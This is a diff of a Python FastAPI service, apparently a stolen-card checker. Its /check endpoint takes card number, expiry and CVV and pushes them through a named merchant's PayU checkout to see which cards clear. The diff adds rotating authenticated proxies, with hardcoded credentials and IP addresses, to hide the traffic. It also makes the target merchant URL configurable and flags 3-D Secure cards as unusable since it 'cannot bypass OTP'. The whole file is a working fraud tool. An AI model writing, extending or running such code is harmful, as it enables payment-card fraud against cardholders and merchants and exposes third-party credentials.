@@ -18,6 +18,27 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# PROXY CONFIGURATION
+PROXIES_LIST = [
+    "http://209492:c7gA2juE4@107.175.33.157:8800",
+    "http://209492:c7gA2juE4@107.175.33.171:8800",
+    "http://209492:c7gA2juE4@107.175.66.153:8800",
+    "http://209492:c7gA2juE4@107.175.66.167:8800",
+    "http://209492:c7gA2juE4@107.175.78.165:8800",
+    "http://209492:c7gA2juE4@107.175.78.188:8800",
+    "http://209492:c7gA2juE4@107.175.152.196:8800",
+    "http://209492:c7gA2juE4@107.175.152.204:8800",
+    "http://209492:c7gA2juE4@107.175.152.220:8800",
+    "http://209492:c7gA2juE4@107.175.152.244:8800",
+]
+
+def get_random_proxy():
+    proxy_url = random.choice(PROXIES_LIST)
+    return {
+        "http": proxy_url,
+        "https": proxy_url
+    }
+
 def _random_email():
     chars = string.ascii_lowercase + string.digits
     user = ''.join(random.choices(chars, k=10))
@@ -69,8 +90,14 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
 
     return data
 
-def event_stream(card_num, mm, yy, cvv_code):
+def event_stream(card_num, mm, yy, cvv_code, merchant_url):
+    # Ambil proxy rawak untuk session ni
+    proxies = get_random_proxy()
+    proxy_ip = proxies['http'].split('@')[-1] # Ambil IP je untuk log
+    
     session = requests.Session()
+    session.proxies = proxies # Set proxy ke dalam session
+
     try:
         email = _random_email()
         ua = _random_ua()
@@ -79,15 +106,18 @@ def event_stream(card_num, mm, yy, cvv_code):
         if len(yy) == 2:
             yy = '20' + yy
 
+        # STEP 0: PROXY CONNECTION LOG
+        yield f"data: {json.dumps({'type': 'log', 'msg': f'Routing traffic via Proxy -> {proxy_ip}', 'class': 'info'})}\n\n"
+
         # STEP 1: MERCHANT REQUEST
-        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating connection to Centaurus Merchant API...', 'class': 'info'})}\n\n"
+        yield f"data: {json.dumps({'type': 'log', 'msg': 'Initiating connection to Merchant API...', 'class': 'info'})}\n\n"
         
         headers1 = {
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://beta3.centaurus.org.pl',
-            'referer': 'https://beta3.centaurus.org.pl/payu/',
+            'origin': merchant_url,
+            'referer': merchant_url,
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -106,7 +136,7 @@ def event_stream(card_num, mm, yy, cvv_code):
             'extra': '',
         }
 
-        r1 = session.post('https://beta3.centaurus.org.pl/ajax/horse_payu/', headers=headers1, data=data1, timeout=30)
+        r1 = session.post(f'{merchant_url}ajax/horse_payu/', headers=headers1, data=data1, timeout=30)
 
         order_id = None
         token = None
@@ -149,7 +179,7 @@ def event_stream(card_num, mm, yy, cvv_code):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://beta3.centaurus.org.pl/',
+            'referer': merchant_url,
             'user-agent': ua,
         }
 
@@ -205,7 +235,6 @@ def event_stream(card_num, mm, yy, cvv_code):
         card_token = token_data.get('value')
 
         if not card_token:
-            # DIPERBAIKI: Lebih detail semasa tangkap error tokenization
             error_obj = token_data.get('error', {})
             if isinstance(error_obj, dict):
                 error_msg = error_obj.get('message', '') or error_obj.get('description', '')
@@ -213,7 +242,6 @@ def event_stream(card_num, mm, yy, cvv_code):
                 error_msg = str(token_data.get('error', ''))
             
             if not error_msg:
-                # Jika masih kosong, ambil seluruh response sebagai rujukan
                 error_msg = f"Invalid card details or unsupported card type. (Raw: {str(token_data)[:100]})"
             
             yield f"data: {json.dumps({'type': 'log', 'msg': f'Tokenization Failed: {error_msg}', 'class': 'error'})}\n\n"
@@ -285,12 +313,10 @@ def event_stream(card_num, mm, yy, cvv_code):
         category = final_status.get('category', '')
         value = final_status.get('value', '')
 
-        # FINAL RESULT LOGGING (DIPERBAIKI: 3DS DIANGGAP DECLINE)
         if category == 'SUCCESS':
             yield f"data: {json.dumps({'type': 'log', 'msg': 'Transaction completed: PAYMENT SUCCESSFUL', 'class': 'success'})}\n\n"
             yield f"data: {json.dumps({'type': 'result', 'msg': 'Payment Successful', 'status': 'success', 'raw': final_status})}\n\n"
         
-        # PERUBAHAN DI SINI: 3DS dan IN_PROGRESS dianggap DECLINE
         elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
             yield f"data: {json.dumps({'type': 'log', 'msg': f'Bank Response: 3DS_REQUIRED / {value}', 'class': 'error'})}\n\n"
             yield f"data: {json.dumps({'type': 'log', 'msg': 'Conclusion: 3DS Card detected. Marked as DECLINED (Cannot bypass OTP).', 'class': 'error'})}\n\n"
@@ -305,6 +331,9 @@ def event_stream(card_num, mm, yy, cvv_code):
             yield f"data: {json.dumps({'type': 'log', 'msg': f'Uncertain Gateway Response: {category} - {value}', 'class': 'warn'})}\n\n"
             yield f"data: {json.dumps({'type': 'result', 'msg': f'{category}: {value}', 'status': 'error', 'raw': final_status})}\n\n"
 
+    except requests.exceptions.ProxyError:
+        yield f"data: {json.dumps({'type': 'log', 'msg': 'Proxy Error. Failed to connect to the proxy server.', 'class': 'error'})}\n\n"
+        yield f"data: {json.dumps({'type': 'result', 'msg': 'Proxy Connection Failed', 'status': 'error', 'raw': {}})}\n\n"
     except requests.exceptions.Timeout:
         yield f"data: {json.dumps({'type': 'log', 'msg': 'Connection Timeout. Gateway took too long to respond.', 'class': 'error'})}\n\n"
         yield f"data: {json.dumps({'type': 'result', 'msg': 'Timeout from Payment Gateway', 'status': 'error', 'raw': {}})}\n\n"
@@ -315,7 +344,7 @@ def event_stream(card_num, mm, yy, cvv_code):
         session.close()
 
 @app.get("/check")
-def check_card(cc: str = Query(...)):
+def check_card(cc: str = Query(...), url: str = Query("https://beta3.centaurus.org.pl/payu/")):
     parts = cc.split('|')
     if len(parts) != 4:
         raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
@@ -325,4 +354,8 @@ def check_card(cc: str = Query(...)):
     if len(yy) == 2:
         yy = '20' + yy
         
-    return StreamingResponse(event_stream(card_num, mm, yy, cvv_code), media_type="text/event-stream")
+    # Pastikan URL ada slash di akhir
+    if not url.endswith('/'):
+        url += '/'
+        
+    return StreamingResponse(event_stream(card_num, mm, yy, cvv_code, url), media_type="text/event-stream")
